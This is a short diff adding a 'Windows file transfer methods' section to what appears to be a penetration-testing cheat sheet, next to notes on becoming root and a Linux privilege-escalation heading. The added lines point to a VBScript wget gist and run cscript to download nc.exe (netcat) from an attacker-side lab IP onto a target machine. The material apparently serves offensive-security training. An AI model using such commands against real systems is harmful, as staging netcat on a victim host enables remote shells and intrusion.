@@ -125,6 +125,13 @@ $ sudo su	# execute su as root
 $ su root	# become root
 ```
 
+Windows file transfer methods:
+```vbs
+# Copy/paste into Windows shell: https://gist.github.com/sckalath/ec7af6a1786e3de6c309
+# Run:
+$ cscript wget.vbs http://10.11.0.42/nc.exe
+```
+
 Linux Privesc:
 ```bash
 # OS? Version? Architecture?
